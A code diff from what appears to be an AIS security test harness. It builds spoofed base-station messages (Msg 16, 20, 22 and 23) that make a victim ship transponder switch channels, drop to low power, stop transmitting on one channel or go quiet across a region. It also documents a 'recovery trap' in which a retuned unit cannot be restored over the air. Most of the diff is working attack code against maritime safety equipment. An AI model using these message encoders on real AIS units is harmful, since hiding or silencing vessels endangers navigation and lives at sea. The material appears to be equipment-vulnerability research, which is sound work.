@@ -580,16 +580,34 @@ def build_extras(ctx):
     return ex
 
 
-def _m22_regional(src, vlat, vlon, ch_a, ch_b, power=0):
+def _m22_regional(src, vlat, vlon, ch_a, ch_b, power=0, tx_rx=0):
     """A spec-valid BROADCAST regional Msg 22 whose region contains the victim, commanding
     channels ch_a/ch_b. Per IEC 61993-2 17.2/17.7 a unit applies a regional channel setting
     when it is inside the defined area, so this is the correctly-formatted form the earlier
-    addressed test was missing."""
+    addressed test was missing. `power`=1 commands LOW power; `tx_rx` selects the Tx/Rx mode
+    (0 = Tx+Rx on both channels; 1 = Tx on channel A only; 2 = Tx on channel B only)."""
     ne_lat = int(round((vlat + 1.0) * 600)); ne_lon = int(round((vlon + 1.0) * 600))
     sw_lat = int(round((vlat - 1.0) * 600)); sw_lon = int(round((vlon - 1.0) * 600))
-    return enc.encode_type22(src, channel_a=ch_a, channel_b=ch_b, tx_rx=0, power=power,
+    return enc.encode_type22(src, channel_a=ch_a, channel_b=ch_b, tx_rx=tx_rx, power=power,
                              ne_lon=ne_lon, ne_lat=ne_lat, sw_lon=sw_lon, sw_lat=sw_lat,
                              addressed=0, zonesize=3)
+
+
+def _m23_group(src, vlat, vlon, station_type=0, ship_type=0, tx_rx=0, interval=0, quiet=0):
+    """A spec-valid BROADCAST Msg 23 group-assignment command whose region contains the victim.
+    Msg 23 is a base-station function that reconfigures every station in a geographic region that
+    matches a station-type / ship-type filter (0/0 = all). `interval` sets a slower reporting
+    interval (0 = default, larger = slower); `quiet` sets a quiet time in minutes (0 = none,
+    1-15 = go silent for that many minutes) -- a direct region-wide silence lever. 160 bits;
+    verified to round-trip through pyais (msg_type 23, region + fields intact)."""
+    ne_lat = int(round((vlat + 1.0) * 600)); ne_lon = int(round((vlon + 1.0) * 600))
+    sw_lat = int(round((vlat - 1.0) * 600)); sw_lon = int(round((vlon - 1.0) * 600))
+    b  = enc._bits(23, 6) + enc._bits(0, 2) + enc._bits(src, 30) + enc._bits(0, 2)
+    b += enc._bits(ne_lon, 18) + enc._bits(ne_lat, 17)
+    b += enc._bits(sw_lon, 18) + enc._bits(sw_lat, 17)
+    b += enc._bits(station_type, 4) + enc._bits(ship_type, 8) + enc._bits(0, 22)
+    b += enc._bits(tx_rx, 2) + enc._bits(interval, 4) + enc._bits(quiet, 4) + enc._bits(0, 6)
+    return (b + "0" * 160)[:160]
 
 
 # Channel-management + slot-reservation retry, using spec-valid base-station messages so M22/M20
@@ -598,41 +616,92 @@ ALT_CH_A, ALT_CH_B = 2084, 2085          # regional channels off the default AIS
 DEF_CH_A, DEF_CH_B = 2087, 2088          # AIS1/AIS2
 
 def build_chanmgmt(ctx):
+    """Base-station command suite, re-runnable on its own (--chanmgmt-only). ORDERING RATIONALE:
+    a successful M22 channel switch REMOVES the victim from the witness's channels (AIS1/AIS2),
+    after which nothing else can be observed there -- the furuno_extra_base capture showed exactly
+    this (the unit's later M20 cells were unobservable once it had been retuned). So every test
+    that is observable while the unit is still on the default channels (rate, slots, group
+    assignment, power, single-channel Tx/Rx) runs FIRST, and the channel switch runs LAST. Each
+    management cell re-announces the base (Msg 4) so a unit that checks station class always sees a
+    live base. All injection goes out the simulator's single fixed channel, so a restore sent on
+    the default channel will NOT reach a unit that has already moved -- that is the demonstrated
+    recovery trap, handled by the operator note in the runner, not an encoding bug."""
     V = ctx.victim_mmsi
     vlat, vlon = ctx.victim_lat, ctx.victim_lon
+    m4 = (enc.encode_type4(BASE_MMSI, vlat + 0.2, vlon + 0.2, hour=12, minute=0, second=0),
+          "Msg4 base-station announcement")
     cm = []
-    # establish the base station first (Msg 4), so a unit that checks station class sees a base
-    cm.append(("cm_announce_base",
-        [(enc.encode_type4(BASE_MMSI, vlat + 0.2, vlon + 0.2, hour=12, minute=0, second=0),
-          "Msg4 base-station announcement")]))
-    # 1) base commands the region to the ALT channels -> unit should leave AIS1/AIS2
-    cm.append(("cm_m22_base_altchan",
-        [(_m22_regional(BASE_MMSI, vlat, vlon, ALT_CH_A, ALT_CH_B),
-          f"M22 (base) regional channel switch to {ALT_CH_A}/{ALT_CH_B}")]))
-    # recovery: base restores default channels for the region
-    cm.append(("cm_m22_base_restore",
-        [(_m22_regional(BASE_MMSI, vlat, vlon, DEF_CH_A, DEF_CH_B),
-          f"M22 (base) restore default channels {DEF_CH_A}/{DEF_CH_B}")]))
-    # 2) SOURCE AUTHORITY: same command from an ordinary ship -> does the unit still obey?
-    cm.append(("cm_m22_ship_altchan",
-        [(_m22_regional(REGULAR_MMSI, vlat, vlon, ALT_CH_A, ALT_CH_B),
-          f"M22 (ordinary ship) regional channel switch to {ALT_CH_A}/{ALT_CH_B}")]))
-    cm.append(("cm_m22_ship_restore",
-        [(_m22_regional(BASE_MMSI, vlat, vlon, DEF_CH_A, DEF_CH_B),
-          "M22 (base) restore default channels after ship test")]))
-    # 3) slot reservation (Msg 20) from base, then ship. We reserve blocks that cover the slots a
-    #    Class A at slow speed typically uses (it transmits ~6 times per 60 s frame, spread evenly).
-    #    A unit that HONORS a base FATDMA reservation must vacate any reserved slot it was using;
-    #    the analyzer computes each victim frame's absolute slot from timing and checks whether the
-    #    victim ever transmits inside a reserved block after the command. This makes M20 a direct
-    #    yes/no test, not a reselection-rate estimate. Default targets bracket the observed slot set
-    #    (~60, 420, 810, 1170, 1525, 1870); if a unit uses different slots, recompute from a
-    #    baseline capture and pass --m20-slots.
+    cm.append(("cm_announce_base", [m4]))
+
+    # ================= ON-CHANNEL TESTS (victim still on AIS1/AIS2, so observable) =============
+    # 1) M16 reporting-rate assignment: base then ship (authority), then release. Retest for
+    #    Furuno WITH a base announced -- the earlier M16 no-effect may have been the missing base.
+    cm.append(("cm_m16_base_fastrate",
+        [m4, (enc.encode_type16(BASE_MMSI, V, offset_a=600, increment_a=0),
+              "M16 (base) force MAX reporting rate 600/10min")]))
+    cm.append(("cm_m16_ship_fastrate",
+        [m4, (enc.encode_type16(REGULAR_MMSI, V, offset_a=600, increment_a=0),
+              "M16 (ordinary ship) force MAX rate -- authority test")]))
+    cm.append(("cm_m16_base_release",
+        [m4, (enc.encode_type16(BASE_MMSI, V, offset_a=20, increment_a=0),
+              "M16 (base) release to slow rate (autonomous wins)")]))
+
+    # 2) M20 FATDMA slot reservation over the victim's typical slots: base then ship. With the
+    #    victim still on AIS1/AIS2 the analyzer can check whether it vacates the reserved slots.
+    #    Default targets bracket a slow Class A's observed slot set (~60,420,810,1170,1525,1870).
     def m20_blocks(src):
-        return [(enc.encode_type20(src, offset1=off, slots1=15, timeout1=7),
-                 f"M20 reserve slots {off}-{off+14}") for off in M20_TARGET_OFFSETS]
+        return [m4] + [(enc.encode_type20(src, offset1=off, slots1=15, timeout1=7),
+                        f"M20 reserve slots {off}-{off+14}") for off in M20_TARGET_OFFSETS]
     cm.append(("cm_m20_base", m20_blocks(BASE_MMSI)))
     cm.append(("cm_m20_ship", m20_blocks(REGULAR_MMSI)))
+
+    # 3) M23 group assignment (region + all station/ship types): slow the reporting interval,
+    #    base then ship, then clear. Reversible and observable as a rate change on the witness.
+    #    (The helper also supports quiet=1..15 for region-wide silence; not used here because a
+    #    quiet time would confound the later on-channel cells. Run it alone if you want it.)
+    cm.append(("cm_m23_base_slow",
+        [m4, (_m23_group(BASE_MMSI, vlat, vlon, interval=11, quiet=0),
+              "M23 (base) group assignment: slow reporting interval over the region")]))
+    cm.append(("cm_m23_ship_slow",
+        [m4, (_m23_group(REGULAR_MMSI, vlat, vlon, interval=11, quiet=0),
+              "M23 (ordinary ship) group slow -- authority test")]))
+    cm.append(("cm_m23_base_clear",
+        [m4, (_m23_group(BASE_MMSI, vlat, vlon, interval=0, quiet=0),
+              "M23 (base) clear group assignment")]))
+
+    # 4) M22 power: command LOW power on the same (default) channels; the victim stays on
+    #    AIS1/AIS2 so a drop in received signal level on the witness is the observable effect.
+    cm.append(("cm_m22_base_powerlow",
+        [m4, (_m22_regional(BASE_MMSI, vlat, vlon, DEF_CH_A, DEF_CH_B, power=1),
+              "M22 (base) set LOW power on default channels")]))
+    cm.append(("cm_m22_base_powerrestore",
+        [m4, (_m22_regional(BASE_MMSI, vlat, vlon, DEF_CH_A, DEF_CH_B, power=0),
+              "M22 (base) restore HIGH power")]))
+
+    # 5) M22 Tx/Rx mode = Tx on channel A only: the victim should stop transmitting on B while
+    #    still on A -- a partial, observable disappearance -- then restore both channels.
+    cm.append(("cm_m22_base_txrxA",
+        [m4, (_m22_regional(BASE_MMSI, vlat, vlon, DEF_CH_A, DEF_CH_B, tx_rx=1),
+              "M22 (base) Tx on channel A only (mode 1)")]))
+    cm.append(("cm_m22_base_txrxrestore",
+        [m4, (_m22_regional(BASE_MMSI, vlat, vlon, DEF_CH_A, DEF_CH_B, tx_rx=0),
+              "M22 (base) restore Tx on both channels")]))
+
+    # ================= OFF-CHANNEL TEST LAST (removes the victim from AIS1/AIS2) ================
+    # 6) Channel switch to the alternate regional pair. SHIP first while the victim is still on the
+    #    default channels (expect NO effect -> victim stays visible = ship authority rejected),
+    #    then BASE (expect the victim to leave AIS1/AIS2 = accepted). This is the proven positive;
+    #    nothing after it is observable on the witness, so it is intentionally last. The restore is
+    #    sent on the default channel and will NOT reach a unit that has moved (recovery trap).
+    cm.append(("cm_m22_ship_altchan",
+        [m4, (_m22_regional(REGULAR_MMSI, vlat, vlon, ALT_CH_A, ALT_CH_B),
+              f"M22 (ordinary ship) regional switch to {ALT_CH_A}/{ALT_CH_B} -- expect IGNORED")]))
+    cm.append(("cm_m22_base_altchan",
+        [m4, (_m22_regional(BASE_MMSI, vlat, vlon, ALT_CH_A, ALT_CH_B),
+              f"M22 (base) regional switch to {ALT_CH_A}/{ALT_CH_B} -- expect victim leaves AIS1/AIS2")]))
+    cm.append(("cm_m22_base_restore",
+        [m4, (_m22_regional(BASE_MMSI, vlat, vlon, DEF_CH_A, DEF_CH_B),
+              f"M22 (base) restore default {DEF_CH_A}/{DEF_CH_B} (may not reach a moved unit)")]))
     return cm
 
 M20_TARGET_OFFSETS = [60, 420, 810, 1170, 1525, 1870]   # bracket a slow Class A's typical slots
@@ -771,6 +840,12 @@ def main():
     ap.add_argument("--chanmgmt-gap", type=float, default=45.0,
                     help="dwell after each channel-management command (long, so a channel "
                          "switch is unambiguous on the witness)")
+    ap.add_argument("--chanmgmt-preroll", type=float, default=90.0,
+                    help="no-injection baseline (victim on AIS1/AIS2) logged before the "
+                         "channel-management suite so the later vanish is measured against it")
+    ap.add_argument("--chanmgmt-postroll", type=float, default=90.0,
+                    help="no-injection window after the suite to see whether the victim "
+                         "returns to AIS1/AIS2 once the default channels are restored")
     ap.add_argument("--photo", choices=["impossible_speed", "forged_identity",
                                         "sart_distress", "dos_noposition"],
                     help="play ONE photogenic attack in an infinite loop (Ctrl-C to stop) so the "
@@ -949,29 +1024,61 @@ def main():
                     if i < len(sx) - 1:
                         time.sleep(args.gap)
 
-        # ---- channel-management / slot-reservation retry (--chanmgmt or --chanmgmt-only) ----
+        # ---- channel-management / base-authority suite (--chanmgmt or --chanmgmt-only) ----
         if args.chanmgmt or args.chanmgmt_only:
             cm = build_chanmgmt(ctx)
-            print(f"\n=== CHANNEL MANAGEMENT RETRY: {len(cm)} steps, {args.chanmgmt_gap}s dwell each ===")
-            print("    watch the WITNESS: if the victim leaves AIS1/AIS2 after an M22, its frames")
-            print("    vanish from the witness while its SERIAL output continues (alive, moved channel).")
+            print("\n" + "=" * 72)
+            print("  RF WITNESS REQUIRED. Make sure record_ais.sh is RUNNING on channels AB")
+            print("  (AIS1/AIS2, 2087/2088) and LEAVE IT RUNNING until this prints 'CHANMGMT DONE'.")
+            print("  Clocks need NOT be synced: alignment is done offline from shared injected")
+            print("  events, not wall time. On-channel tests run first; the channel switch is last.")
+            print("=" * 72)
             rec(event="chanmgmt_start", n=len(cm), base_mmsi=BASE_MMSI, regular_mmsi=REGULAR_MMSI,
-                alt_ch=(ALT_CH_A, ALT_CH_B), def_ch=(DEF_CH_A, DEF_CH_B))
+                alt_ch=(ALT_CH_A, ALT_CH_B), def_ch=(DEF_CH_A, DEF_CH_B),
+                witness_channels="AB (2087/2088)",
+                note="on-channel tests first; channel switch last (removes victim from witness)")
+            # PREROLL: a labelled no-injection baseline so the witness has a clean 'victim present
+            # on AIS1/AIS2' reference; the later vanish is measured against this window.
+            rec(event="chanmgmt_preroll_start", seconds=args.chanmgmt_preroll)
+            print(f"    preroll: {args.chanmgmt_preroll:.0f}s baseline (victim on AIS1/AIS2, no injection)...")
+            time.sleep(args.chanmgmt_preroll)
+            rec(event="chanmgmt_preroll_end")
+            print(f"\n=== CHANNEL MANAGEMENT: {len(cm)} steps, {args.chanmgmt_gap}s dwell each ===")
             for i, (name, payloads) in enumerate(cm):
                 # tag command + source so the analyzer can build the base-vs-ship result
-                src = "base" if ("base" in name or name == "cm_announce_base") else "ship"
-                cmd = "M22" if "m22" in name else ("M20" if "m20" in name else "announce")
+                src = "ship" if "ship" in name else "base"
+                if   "m22" in name: cmd = "M22"
+                elif "m20" in name: cmd = "M20"
+                elif "m16" in name: cmd = "M16"
+                elif "m23" in name: cmd = "M23"
+                else:               cmd = "announce"
                 fire(name, payloads, i, len(cm), tag="CM:", extra={"command": cmd, "source": src})
                 if i < len(cm) - 1:
-                    dwell = 8 if name.endswith("restore") or name == "cm_announce_base" else args.chanmgmt_gap
+                    short = name.endswith(("restore", "release", "clear")) or name == "cm_announce_base"
+                    dwell = 8 if short else args.chanmgmt_gap
                     print(f"    ...{dwell:.0f}s dwell (watch witness for the victim on AIS1/AIS2)...")
                     time.sleep(dwell)
-            # final safety recovery: force the region back to the default channels several times
-            print("    final recovery: restoring default AIS channels for the region")
+            # final safety recovery: force the region back to the default channels several times.
+            # NOTE: this goes out the simulator's single fixed channel, so if the unit already moved
+            # it will NOT hear this -- that is the demonstrated recovery trap, not a bug.
+            print("    final recovery: restoring default AIS channels + high power for the region")
             for _ in range(3):
-                ws.send(_m22_regional(BASE_MMSI, ctx.victim_lat, ctx.victim_lon, DEF_CH_A, DEF_CH_B))
+                ws.send(_m22_regional(BASE_MMSI, ctx.victim_lat, ctx.victim_lon,
+                                      DEF_CH_A, DEF_CH_B, power=0))
                 rec(event="final_recovery", meta="restore default channels (regional M22)")
                 time.sleep(1)
+            # POSTROLL: labelled no-injection window to check whether the victim RETURNS to
+            # AIS1/AIS2 after the restore (in the furuno run it did not -> the recovery trap).
+            rec(event="chanmgmt_postroll_start", seconds=args.chanmgmt_postroll)
+            print(f"    postroll: {args.chanmgmt_postroll:.0f}s, watching whether the victim returns to AIS1/AIS2...")
+            time.sleep(args.chanmgmt_postroll)
+            rec(event="chanmgmt_postroll_end")
+            print("\n" + "!" * 72)
+            print("  CHANMGMT DONE -- stop the RF and serial recorders now.")
+            print("  RECOVERY: if the unit is still OFF AIS1/AIS2, a restore sent on the default")
+            print("  channel cannot reach it. Clear its regional/channel settings from the MKD")
+            print(f"  front panel, or transmit the restore on the alt channels {ALT_CH_A}/{ALT_CH_B}.")
+            print("!" * 72)
 
         # ---- phase 2: aggressive tests, larger gaps, severity-ordered ----
         if args.phase2 or args.phase2_only:
